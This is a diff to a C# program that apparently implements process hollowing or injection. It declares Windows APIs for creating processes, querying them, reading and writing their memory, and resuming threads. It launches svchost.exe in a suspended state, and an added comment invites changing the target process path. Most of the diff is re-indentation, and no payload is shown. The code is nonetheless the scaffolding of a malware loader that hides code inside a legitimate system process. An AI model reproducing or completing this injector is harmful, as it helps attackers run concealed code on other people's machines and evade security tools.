@@ -55,21 +55,22 @@ namespace ConsoleApp2
 
         [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
         static extern bool CreateProcess(string lpApplicationName, string lpCommandLine,
-    IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles,
-        uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
+	    IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles,
+	    uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
             [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
 
         [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
         private static extern int ZwQueryInformationProcess(IntPtr hProcess,
-    int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation,
-        uint ProcInfoLen, ref uint retlen);
+	    int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation,
+	    uint ProcInfoLen, ref uint retlen);
 
         [DllImport("kernel32.dll", SetLastError = true)]
         static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
-    [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);
+	    [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);
 
         [DllImport("kernel32.dll")]
-        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
+        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, 
+	    byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
 
         [DllImport("kernel32.dll", SetLastError = true)]
         private static extern uint ResumeThread(IntPtr hThread);
@@ -79,6 +80,7 @@ namespace ConsoleApp2
             STARTUPINFO si = new STARTUPINFO();
             PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
 
+	    // CHANGE THE PROCESS PATH TO WHATEVER 
             bool res = CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", IntPtr.Zero,
                 IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);
 
